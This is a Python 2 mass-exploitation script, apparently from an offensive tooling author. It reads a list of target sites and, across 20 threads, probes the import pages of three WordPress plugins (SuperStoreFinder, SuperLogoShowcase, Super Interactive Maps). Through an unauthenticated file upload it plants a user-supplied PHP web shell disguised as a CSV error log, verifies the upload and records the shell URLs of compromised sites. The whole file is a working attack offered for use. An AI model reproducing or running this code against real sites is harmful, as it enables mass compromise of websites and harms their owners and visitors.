#!/usr/bin/python2.7
# -*- coding: utf-8 -*-
#Author D4RK5H4D0W5
G = '\033[0;32m';C = '\033[0;36m';W = '\033[0;37m';R = '\033[0;31m'
import os,sys,requests as r
from multiprocessing.pool import ThreadPool
def upload_sh3ll(site,path):
	sh3ll=open(sys.argv[2]).read()
	r.post(site+path,files={'default_location':('2001_error_log.csv.PhP',sh3ll,'application/octet-stream')},timeout=5)
	if 'superstorefinder-wp' in path:
		cek_sh3ll=r.get(site+'/wp-content/plugins/superstorefinder-wp/ssf-wp-admin/pages/SSF_WP_UPLOADS_PATH/csv/import/2001_error_log.csv.PhP',timeout=5)
		if 'Bypass MINSHELL' in cek_sh3ll.text or cek_sh3ll.status_code==200:print '%s[%s✓%s] Success upload shell\n    %s/wp-content/plugins/superstorefinder-wp/ssf-wp-admin/pages/SSF_WP_UPLOADS_PATH/csv/import/2001_error_log.csv.PhP'%(W,G,W,site);open('results.txt','a+').write(site+'/wp-content/plugins/superstorefinder-wp/ssf-wp-admin/pages/SSF_WP_UPLOADS_PATH/csv/import/2001_error_log.csv.PhP'+'\n')
		else:
			cek_sh3ll_=r.get(site+'/wp-content/plugins/superstorefinder-wp/ssf-wp-admin/2001_error_log.csv.PhP',timeout=5)
			if 'Bypass MINSHELL' in cek_sh3ll_.text or cek_sh3ll_.status_code==200:print '%s[%s✓%s] Success upload shell\n    %s/wp-content/plugins/superstorefinder-wp/ssf-wp-admin/2001_error_log.csv.PhP'%(W,G,W,site);open('results.txt','a+').write(site+'/wp-content/plugins/superstorefinder-wp/ssf-wp-admin/2001_error_log.csv.PhP'+'\n')
			else:print '%s[%s%s%s] Failed upload shell'%(W,R,cek_sh3ll_.status_code,W);open('vuln.txt','a+').write(site+path+'\n')
	elif 'superlogoshowcase-wp' in path:
		cek_sh3ll=r.get(site+'/wp-content/plugins/superlogoshowcase-wp/sls-wp-admin/2001_error_log.csv.PhP',timeout=5)
		if 'Bypass MINSHELL' in cek_sh3ll.text or cek_sh3ll.status_code==200:print '%s[%s✓%s] Success upload shell\n    %s/wp-content/plugins/superlogoshowcase-wp/sls-wp-admin/2001_error_log.csv.PhP'%(W,G,W,site);open('results.txt','a+').write(site+'/wp-content/plugins/superlogoshowcase-wp/sls-wp-admin/2001_error_log.csv.PhP'+'\n')
		else:print '%s[%s%s%s] Failed upload shell'%(W,R,cek_sh3ll.status_code,W);open('vuln.txt','a+').write(site+path+'\n')
	elif 'super-interactive-maps' in path:
		cek_sh3ll=r.get(site+'/wp-content/plugins/super-interactive-maps/sim-wp-admin/2001_error_log.csv.PhP',timeout=5)
		if 'Bypass MINSHELL' in cek_sh3ll.text or cek_sh3ll.status_code==200:print '%s[%s✓%s] Success upload shell\n    %s/wp-content/plugins/super-interactive-maps/sim-wp-admin/2001_error_log.csv.PhP'%(W,G,W,site);open('results.txt','a+').write(site+'/wp-content/plugins/super-interactive-maps/sim-wp-admin/2001_error_log.csv.PhP'+'\n')
		else:print '%s[%s%s%s] Failed upload shell'%(W,R,cek_sh3ll.status_code,W);open('vuln.txt','a+').write(site+path+'\n')
def get_vuln(site):
	try:
		path=['/wp-content/plugins/superstorefinder-wp/ssf-wp-admin/pages/import.php','/wp-content/plugins/superlogoshowcase-wp/sls-wp-admin/pages/import.php','/wp-content/plugins/super-interactive-maps/sim-wp-admin/pages/import.php']
		print '\n%s[%s!%s] Check website %s'%(W,R,W,site)
		cek_vuln=r.get(site+path[0],timeout=5)
		if "<div class='wrap'>" in cek_vuln.text or cek_vuln.status_code==500:print '%s[%s✓%s] Vuln %s'%(W,G,W,site);upload_sh3ll(site,path[0])
		else:
			cek_vuln_=r.get(site+path[1],timeout=5)
			if "<div class='wrap'>" in cek_vuln_.text or cek_vuln_.status_code==500:print '%s[%s✓%s] Vuln %s'%(W,G,W,site);upload_sh3ll(site,path[1])
			else:
				cek_vuln__=r.get(site+path[2],timeout=5)
				if "<div class='wrap'>" in cek_vuln__.text or cek_vuln__.status_code==500:print '%s[%s✓%s] Vuln %s'%(W,G,W,site);upload_sh3ll(site,path[2])
				else:print '%s[%sx%s] Not vuln %s'%(W,R,W,site)
	except:print '%s[%sx%s] Web error %s'%(W,R,W,site);pass
if __name__=='__main__':
	#try:
		os.system('cls' if os.name == 'nt' else 'clear')
		print '''%s
   _____ ____________________ 
  /  _  \\\______   \____    /    %sGithub : https://github.com/N721%s
 /  /_\  \|       _/ /     /     %sIG : @bullz_coder%s
/    |    \    |   \/     /_     %sFB : Hyodo Issei%s
\____|__  /____|_  /_______ \    %sWP SuperStoreFinder 6.1%s
        \/       \/        \/ 
		'''%(C,W,C,W,C,W,C,W,C)
		sys.argv[2]
		#for site in open(sys.argv[1]).read().splitlines():
			#get_vuln(site)
		ThreadPool(20).map(get_vuln,open(sys.argv[1]).read().splitlines())
		print '\n%s[%s✓%s] Saved in results.txt\n    Failed upload saved in vuln.txt'%(W,G,W)
	#except IndexError:exit('\n%s[%s!%s] Use : python2 %s target.txt shell.php\n    Example: https://target.com'%(W,R,W,sys.argv[0]))
	#except IOError:exit('\n%s[%s!%s] File does not exist'%(W,R,W))
	#except r.exceptions.ConnectionError:exit('\n%s[%s!%s] Check internet'%(W,R,W))
	#except KeyboardInterrupt:exit('%s[%s!%s] Exit'%(W,R,W))